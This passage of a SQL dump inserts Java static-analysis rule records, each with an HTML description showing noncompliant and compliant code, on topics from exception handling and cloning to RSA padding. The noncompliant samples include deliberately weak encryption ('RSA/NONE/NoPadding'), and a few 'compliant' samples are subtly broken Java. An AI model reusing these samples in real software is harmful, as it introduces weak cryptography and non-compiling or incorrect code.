<h2>Noncompliant Code Example</h2>
<pre>
try { /* ... */ } catch (Throwable t) { /* ... */ }
try { /* ... */ } catch (Error e) { /* ... */ }
</pre>
<h2>Compliant Solution</h2>
<pre>
try { /* ... */ } catch (RuntimeException e) { /* ... */ }
try { /* ... */ } catch (MyException e) { /* ... */ }
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/396.html">MITRE, CWE-396</a> - Declaration of Catch for Generic Exception </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/BIB3AQ">CERT, ERR08-J.</a> - Do not catch NullPointerException or any of its ancestors
  </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'bad-practice,cert,cwe,error-handling', false, 'HTML', 1510817813015, 1510817813015, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (968, 'Classes that override "clone" should be "Cloneable" and call "super.clone()"', 'S1182', NULL, 'squid', '<p><code>Cloneable</code> is the marker <code>Interface</code> that indicates that <code>clone()</code> may be called on an object. Overriding
<code>clone()</code> without implementing <code>Cloneable</code> can be useful if you want to control how subclasses clone themselves, but otherwise,
it''s probably a mistake.</p>
<p>The usual convention for <code>Object.clone()</code> according to Oracle''s Javadoc is:</p>
<ol>
  <li> <code>x.clone() != x</code> </li>
  <li> <code>x.clone().getClass() == x.getClass()</code> </li>
  <li> <code>x.clone().equals\(x\)</code> </li>
</ol>
<p>Obtaining the object that will be returned by calling <code>super.clone()</code> helps to satisfy those invariants:</p>
<ol>
  <li> <code>super.clone()</code> returns a new object instance </li>
  <li> <code>super.clone()</code> returns an object of the same type as the one <code>clone()</code> was called on </li>
  <li> <code>Object.clone()</code> performs a shallow copy of the object''s state </li>
</ol>
<h2>Noncompliant Code Example</h2>
<pre>
class BaseClass {  // Noncompliant; should implement Cloneable
  @Override
  public Object clone() throws CloneNotSupportedException {    // Noncompliant; should return the super.clone() instance
    return new BaseClass();
  }
}

class DerivedClass extends BaseClass implements Cloneable {
  /* Does not override clone() */

  public void sayHello() {
    System.out.println("Hello, world!");
  }
}

class Application {
  public static void main(String[] args) throws Exception {
    DerivedClass instance = new DerivedClass();
    ((DerivedClass) instance.clone()).sayHello();              // Throws a ClassCastException because invariant #2 is violated
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class BaseClass implements Cloneable {
  @Override
  public Object clone() throws CloneNotSupportedException {    // Compliant
    return super.clone();
  }
}

class DerivedClass extends BaseClass implements Cloneable {
  /* Does not override clone() */

  public void sayHello() {
    System.out.println("Hello, world!");
  }
}

class Application {
  public static void main(String[] args) throws Exception {
    DerivedClass instance = new DerivedClass();
    ((DerivedClass) instance.clone()).sayHello();              // Displays "Hello, world!" as expected. Invariant #2 is satisfied
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/580.html">MITRE, CWE-580</a> - clone() Method Without super.clone() </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/CQHEAw">CERT, MET53-J.</a> - Ensure that the clone() method calls super.clone() </li>
</ul>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'cert,convention,cwe', false, 'HTML', 1510817813016, 1510817813016, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (969, 'JUnit framework methods should be declared properly', 'S2391', NULL, 'squid', '<p>If the <code>suite</code> method in a JUnit 3 <code>TestCase</code> is not declared correctly, it will not be used. Such a method must be named
"suite", have no arguments, be <code>public static</code>, and must return either a <code>junit.framework.Test</code> or a
<code>junit.framework.TestSuite</code>.</p>
<p>Similarly, <code>setUp</code> and <code>tearDown</code> methods that aren''t properly capitalized will also be ignored.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Test suite() { ... }  // Noncompliant; must be public static
public static boolean suite() { ... }  // Noncompliant; wrong return type
public static Test suit() { ... }  // Noncompliant; typo in method name
public static Test suite(int count) { ... } // Noncompliant; must be no-arg

public void setup() { ... } // Noncompliant; should be setUp
public void tearDwon() { ... }  // Noncompliant; should be tearDown
</pre>
<h2>Compliant Solution</h2>
<pre>
public static Test suite() { ... }
public void setUp() { ... }
public void tearDown() { ... }
</pre>', 4, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'tests', false, 'HTML', 1510817813017, 1510817813017, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (970, '"wait", "notify" and "notifyAll" should only be called when a lock is obviously held on an object', 'S2273', NULL, 'squid', '<p>By contract, the method <code>Object.wait(...)</code>, <code>Object.notify()</code> and <code>Object.notifyAll()</code> should be called by a
thread that is the owner of the object''s monitor. If this is not the case an <code>IllegalMonitorStateException</code> exception is thrown. This rule
reinforces this constraint by making it mandatory to call one of these methods only inside a <code>synchronized</code> method or statement. </p>
<h2>Noncompliant Code Example</h2>
<pre>
private void removeElement() {
  while (!suitableCondition()){
    obj.wait();
  }
  ... // Perform removal
}
</pre>
<p>or</p>
<pre>
private void removeElement() {
  while (!suitableCondition()){
    wait();
  }
  ... // Perform removal
}
</pre>
<h2>Compliant Solution</h2>
<pre>
private void removeElement() {
  synchronized(obj) {
    while (!suitableCondition()){
      obj.wait();
    }
    ... // Perform removal
  }
}
</pre>
<p>or</p>
<pre>
private synchronized void removeElement() {
  while (!suitableCondition()){
    wait();
  }
  ... // Perform removal
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'multi-threading', false, 'HTML', 1510817813018, 1510817813018, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (971, '"Iterator.next()" methods should throw "NoSuchElementException"', 'S2272', NULL, 'squid', '<p>By contract, any implementation of the <code>java.util.Iterator.next()</code> method should throw a <code>NoSuchElementException</code> exception
when the iteration has no more elements. Any other behavior when the iteration is done could lead to unexpected behavior for users of this
<code>Iterator</code>. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyIterator implements Iterator&lt;String&gt;{
  ...
  public String next(){
    if(!hasNext()){
      return null;
    }
    ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyIterator implements Iterator&lt;String&gt;{
  ...
  public String next(){
    if(!hasNext()){
      throw new NoSuchElementException();
    }
    ...
  }
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'unpredictable', false, 'HTML', 1510817813019, 1510817813019, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (972, '"runFinalizersOnExit" should not be called', 'S2151', NULL, 'squid', '<p>Running finalizers on JVM exit is disabled by default. It can be enabled with <code>System.runFinalizersOnExit</code> and
<code>Runtime.runFinalizersOnExit</code>, but both methods are deprecated because they are are inherently unsafe. </p>
<p>According to the Oracle Javadoc:</p>
<blockquote>
  <p>It may result in finalizers being called on live objects while other threads are concurrently manipulating those objects, resulting in erratic
  behavior or deadlock.</p>
</blockquote>
<p>If you really want to be execute something when the virtual machine begins its shutdown sequence, you should attach a shutdown hook. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public static void main(String [] args) {
  ...
  System.runFinalizersOnExit(true);  // Noncompliant
  ...
}

protected void finalize(){
  doSomething();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public static void main(String [] args) {
  Runtime.addShutdownHook(new Runnable() {
    public void run(){
      doSomething();
    }
  });
  //...
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/H4cbAQ">CERT, MET12-J.</a> - Do not use finalizers </li>
</ul>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'cert', false, 'HTML', 1510817813020, 1510817813020, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (974, 'Public types, methods and fields (API) should be documented with Javadoc', 'UndocumentedApi', 'S1176', 'squid', '<p>Try to imagine using the standard Java API (Collections, JDBC, IO, ...) without Javadoc. It would be a nightmare, because Javadoc is the only way
to understand of the contract of the API. Documenting an API with Javadoc increases the productivity of the developers consuming it.</p>
<p>On top of a main description for each member of a public API, the following Javadoc elements are required to be described:</p>
<ul>
  <li> Parameters, using <code>@param parameterName</code>. </li>
  <li> Thrown exceptions, using <code>@throws exceptionName</code>. </li>
  <li> Method return values, using <code>@return</code>. </li>
  <li> Generic types, using <code>@param &lt;T&gt;</code>. </li>
</ul>
<p>Furthermore the following guidelines should be followed:</p>
<ul>
  <li> At least 1 line of description which should have more than one word. </li>
  <li> All parameters documented with <code>@param</code>, and names should match. </li>
  <li> All checked exceptions documented with <code>@throws</code> </li>
  <li> <code>@return</code> present and documented when not <code>void</code>. </li>
  <li> Placeholders like "TODO", "FIXME", "..." should be avoided. </li>
</ul>
<p>The following public methods and constructors are not taken into account by this rule:</p>
<ul>
  <li> Getters and setters. </li>
  <li> Methods with <code>@Override</code> annotation. </li>
  <li> Empty constructors. </li>
  <li> Static constants. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
/**
  * This is a Javadoc comment
  */
public class MyClass&lt;T&gt; implements Runnable {    // Noncompliant - missing ''@param &lt;T&gt;''

  public static final DEFAULT_STATUS = 0;    // Compliant - static constant
  private int status;                           // Compliant - not public

  public String message;                  // Noncompliant

  public MyClass() {                         // Noncompliant - missing documentation
    this.status = DEFAULT_STATUS;
  }

  public void setStatus(int status) {  // Compliant - setter
    this.status = status;
  }

  @Override
  public void run() {                          // Compliant - has @Override annotation
  }

  protected void doSomething() {    // Compliant - not public
  }

  public void doSomething2(int value) {  // Noncompliant
  }

  public int doSomething3(int value) {  // Noncompliant
    return value;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
/**
  * This is a Javadoc comment
  * @param &lt;T&gt; the parameter of the class
  */
public class MyClass&lt;T&gt; implements Runnable {

  public static final DEFAULT_STATUS = 0;
  private int status;

  /**
    * This is a Javadoc comment
    */
  public String message;

  /**
   * Class comment...
   */
  public MyClass() {
    this.status = DEFAULT_STATUS;
  }

  public void setStatus(int status) {
    this.status = status;
  }

  @Override
  public void run() {
  }

  protected void doSomething() {
  }

  /**
    * Will do something.
    * @param value the value to be used
    */
  public void doSomething(int value) {

  /**
    *  {@inheritDoc}
    */
  public int doSomething(int value) {
    return value;
  }
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'convention', false, 'HTML', 1510817813023, 1510817813023, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (975, 'Overriding methods should do more than simply call the same method in the super class', 'S1185', NULL, 'squid', '<p>Overriding a method just to call the same method from the super class without performing any other actions is useless and misleading. The only time
this is justified is in <code>final</code> overriding methods, where the effect is to lock in the parent class behavior. This rule ignores such
overrides of <code>equals</code>, <code>hashCode</code> and <code>toString</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void doSomething() {
  super.doSomething();
}

@Override
public boolean isLegal(Action action) {
  return super.isLegal(action);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@Override
public boolean isLegal(Action action) {         // Compliant - not simply forwarding the call
  return super.isLegal(new Action(/* ... */));
}

@Id
@Override
public int getId() {                            // Compliant - there is annotation different from @Override
  return super.getId();
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'clumsy,redundant', false, 'HTML', 1510817813025, 1510817813026, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (976, 'Printf-style format strings should not lead to unexpected behavior at runtime', 'S2275', NULL, 'squid', '<p>Because <code>printf</code>-style format strings are interpreted at runtime, rather than validated by the Java compiler, they can contain errors
that lead to unexpected behavior or runtime errors. This rule statically validates the good behavior of <code>printf</code>-style formats when calling
the <code>format(...)</code> methods of <code>java.util.Formatter</code>, <code>java.lang.String</code>, <code>java.io.PrintStream</code>,
<code>MessageFormat</code>, and <code>java.io.PrintWriter</code> classes and the <code>printf(...)</code> methods of <code>java.io.PrintStream</code>
or <code>java.io.PrintWriter</code> classes. </p>
<h2>Noncompliant Code Example</h2>
<pre>
String.format("The value of my integer is %d", "Hello World");  // Noncompliant; an ''int'' is expected rather than a String
String.format("Duke''s Birthday year is %tX", c);  //Noncompliant; X is not a supported time conversion character
String.format("Display %0$d and then %d", 1);   //Noncompliant; arguments are numbered starting from 1
String.format("Not enough arguments %d and %d", 1);  //Noncompliant; the second argument is missing
String.format("%&lt; is equals to %d", 2);   //Noncompliant; the argument index ''&lt;'' refers to the previous format specifier but there isn''t one

MessageFormat.format("Result {1}.", value); // Noncompliant; Not enough arguments. (first element is {0})
MessageFormat.format("Result {{0}.", value); // Noncompliant; Unbalanced number of curly brace (single curly braces should be escaped)
MessageFormat.format("Result '' {0}", value); // Noncompliant; Unbalanced number of quotes (single quote must be escaped)
</pre>
<h2>Compliant Solution</h2>
<pre>
String.format("The value of my integer is %d", 3);
String.format("Duke''s Birthday year is %tY", c);
String.format("Display %1$d and then %d", 1);
String.format("Not enough arguments %d and %d", 1, 2);
String.format("%d is equals to %&lt;", 2);

MessageFormat.format("Result {0}.", value);
MessageFormat.format("Result {0} &amp; {1}.", value, value);
MessageFormat.format("Result {0}.", myObject);
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/wQA1">CERT, FIO47-C.</a> - Use valid format strings </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/e4EyAQ">CERT, FIO00-CPP.</a> - Take care when creating format strings </li>
</ul>', 4, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'cert,pitfall', false, 'HTML', 1510817813028, 1510817813028, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (977, 'Dissimilar primitive wrappers should not be used with the ternary operator without explicit casting', 'S2154', NULL, 'squid', '<p>If wrapped primitive values (e.g. <code>Integers</code> and <code>Floats</code>) are used in a ternary operator (e.g. <code>a?b:c</code>), both
values will be unboxed and coerced to a common type, potentially leading to unexpected results. To avoid this, add an explicit cast to a compatible
type.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Integer i = 123456789;
Float f = 1.0f;
Number n = condition ? i : f;  // Noncompliant; i is coerced to float. n = 1.23456792E8
</pre>
<h2>Compliant Solution</h2>
<pre>
Integer i = 123456789;
Float f = 1.0f;
Number n = condition ? (Number) i : f;  // n = 123456789
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817813029, 1510817813029, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (978, 'Methods should not be empty', 'S1186', NULL, 'squid', '<p>There are several reasons for a method not to have a method body:</p>
<ul>
  <li> It is an unintentional omission, and should be fixed to prevent an unexpected behavior in production. </li>
  <li> It is not yet, or never will be, supported. In this case an <code>UnsupportedOperationException</code> should be thrown. </li>
  <li> The method is an intentionally-blank override. In this case a nested comment should explain the reason for the blank override. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public void doSomething() {
}

public void doSomethingElse() {
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@Override
public void doSomething() {
  // Do nothing because of X and Y.
}

@Override
public void doSomethingElse() {
  throw new UnsupportedOperationException();
}
</pre>
<h2>Exceptions</h2>
<p>Default (no-argument) constructors are ignored when there are other constructors in the class, as are empty methods in abstract classes.</p>
<pre>
public abstract class Animal {
  void speak() {  // default implementation ignored
  }
}
</pre>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'suspicious', false, 'HTML', 1510817813030, 1510817813030, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (979, 'Unused labels should be removed', 'S1065', NULL, 'squid', '<p>If a label is declared but not used in the program, it can be considered as dead code and should therefore be removed.</p>
<p>This will improve maintainability as developers will not wonder what this label is used for.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void foo() {
  outer: //label is not used.
  for(int i = 0; i&lt;10; i++) {
    break;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void foo() {
  for(int i = 0; i&lt;10; i++) {
    break;
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2012, 2.6 - A function should not contain unused label declarations </li>
  <li> <a href="https://wwwtsecurecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/SIIyAQ">CERT, MSC12-CPP.</a> - Detect and remove code that has no effect </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'cert,misra,unused', false, 'HTML', 1510817813031, 1510817813031, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (980, '"Object.wait(...)" and "Condition.await(...)" should be called inside a "while" loop', 'S2274', NULL, 'squid', '<p>According to the documentation of the Java <code>Condition</code> interface:</p>
<blockquote>
  <p>When waiting upon a <code>Condition</code>, a "spurious wakeup" is permitted to occur, in general, as a concession to the underlying platform
  semantics. This has little practical impact on most application programs as a Condition should always be waited upon in a loop, testing the state
  predicate that is being waited for. An implementation is free to remove the possibility of spurious wakeups but it is recommended that applications
  programmers always assume that they can occur and so always wait in a loop.</p>
</blockquote>
<p>The same advice is also found for the <code>Object.wait(...)</code> method:</p>
<blockquote>
  <p>waits should always occur in loops, like this one:</p>
  <pre>
synchronized (obj) {
  while (&lt;condition does not hold&gt;){
    obj.wait(timeout);
  }
   ... // Perform action appropriate to condition
}
</pre>
</blockquote>
<h2>Noncompliant Code Example</h2>
<pre>
synchronized (obj) {
  if (!suitableCondition()){
    obj.wait(timeout);   //the thread can wake up even if the condition is still false
  }
   ... // Perform action appropriate to condition
}
</pre>
<h2>Compliant Solution</h2>
<pre>
synchronized (obj) {
  while (!suitableCondition()){
    obj.wait(timeout);
  }
   ... // Perform action appropriate to condition
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/9QIhAQ">CERT THI03-J.</a> - Always invoke wait() and await() methods inside a loop
  </li>
</ul>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'cert,multi-threading', false, 'HTML', 1510817813032, 1510817813032, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (981, 'Boxing and unboxing should not be immediately reversed', 'S2153', NULL, 'squid', '<p>Boxing is the process of putting a primitive value into an analogous object, such as creating an <code>Integer</code> to hold an <code>int</code>
value. Unboxing is the process of retrieving the primitive value from such an object.</p>
<p>Since the original value is unchanged during boxing and unboxing, there''s no point in doing either when not needed. This also applies to autoboxing
and auto-unboxing (when Java implicitly handles the primitive/object transition for you).</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void examineInt(int a) {
  //...
}

public void examineInteger(Integer a) {
  // ...
}

public void func() {
  int i = 0;
  Integer iger1 = Integer.valueOf(0);
  double d = 1.0;

  int dIntValue = new Double(d).intValue(); // Noncompliant

  examineInt(new Integer(i).intValue()); // Noncompliant; explicit box/unbox
  examineInt(Integer.valueOf(i));  // Noncompliant; boxed int will be auto-unboxed

  examineInteger(i); // Compliant; value is boxed but not then unboxed
  examineInteger(iger1.intValue()); // Noncompliant; unboxed int will be autoboxed
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void examineInt(int a) {
  //...
}

public void examineInteger(Integer a) {
  // ...
}

public void func() {
  int i = 0;
  Integer iger1 = Integer.valueOf(0);
  double d = 1.0;

  int dIntValue = (int) d;

  examineInt(i);

  examineInteger(i);
  examineInteger(iger1);
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'clumsy', false, 'HTML', 1510817813033, 1510817813034, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (994, 'Security constraints should be defined', 'S3369', NULL, 'squid', '<p>Websphere, Tomcat, and JBoss web servers allow the definition of role-based access to servlets. It may not be granular enough for your purposes,
but it''s a start, and should be used at least as a base.</p>
<p>This rule raises an issue when a <em>web.xml</em> file has no <code>&lt;security-constraint&gt;</code> elements.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://cwe.mitre.org/data/definitions/284.html">MITRE, CWE-284</a> - Improper Access Control </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10_2013-A7-Missing_Function_Level_Access_Control">OWASP Top Ten 2013 Category A7</a> - Missing
  Function Level Access Control </li>
</ul>', 4, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '3h', NULL, NULL, 'cwe,jee,owasp-a7,websphere', false, 'HTML', 1510817813048, 1510817813048, 3);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (982, 'Method parameters should be declared with base types', 'S3242', NULL, 'squid', '<p>For maximum reusability, methods should accept parameters with as little specialization as possible. So unless specific features from a child class
are required by a method, a type higher up the class hierarchy should be used instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void printSize(ArrayList&lt;Object&gt; list) {  // Collection can be used instead
    System.out.println(list.size());
}

public static void loop(List&lt;Object&gt; list) { // java.lang.Iterable can be used instead
   for (Object o : list) {
     o.toString();
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void printSize(Collection&lt;?&gt; list) {  // Collection can be used instead
    System.out.println(list.size());
}

public static void loop(Iterable&lt;?&gt; list) { // java.lang.Iterable can be used instead
   for (Object o : list) {
     o.toString();
  }
}
</pre>
<h2>Exceptions</h2>
<p>Parameters in non-public methods are not checked, because such methods are not intended to be generally reusable. <code>java.lang.String</code>
parameters are excluded, because String is immutable and can not be always substituted for more generic type. Parameters used in any other context
than method invocation or enhanced for loop are also excluded.</p>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'api-design', false, 'HTML', 1510817813034, 1510817813035, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (983, 'Collapsible "if" statements should be merged', 'S1066', NULL, 'squid', '<p>Merging collapsible <code>if</code> statements increases the code''s readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (file != null) {
  if (file.isFile() || file.isDirectory()) {
    /* ... */
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (file != null &amp;&amp; isFileOrDirectory(file)) {
  /* ... */
}

private static boolean isFileOrDirectory(File file) {
  return file.isFile() || file.isDirectory();
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'clumsy', false, 'HTML', 1510817813035, 1510817813036, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (984, 'Cryptographic RSA algorithms should always incorporate OAEP (Optimal Asymmetric Encryption Padding)', 'S2277', NULL, 'squid', '<p>Without OAEP in RSA encryption, it takes less work for an attacker to decrypt the data or infer patterns from the ciphertext. This rule logs an
issue as soon as a literal value starts with <code>RSA/NONE</code>. </p>
<h2>Noncompliant Code Example</h2>
<pre>
Cipher rsa = javax.crypto.Cipher.getInstance("RSA/NONE/NoPadding");
</pre>
<h2>Compliant Solution</h2>
<pre>
Cipher rsa = javax.crypto.Cipher.getInstance("RSA/ECB/OAEPWITHSHA-256ANDMGF1PADDING");
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/780.html">MITRE CWE-780</a> - Use of RSA Algorithm without OAEP </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/327.html">MITRE CWE-327</a>: Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10_2013-A5-Security_Misconfiguration">OWASP Top Ten 2013 Category A5</a> - Security
  Misconfiguration </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure">OWASP Top Ten 2013 Category A6</a> - Sensitive Data Exposure
  </li>
  <li> Derived from FindSecBugs rule <a href="http://h3xstream.github.io/find-sec-bugs/bugs.htm#RSA_NO_PADDING">RSA NoPadding Unsafe</a> </li>
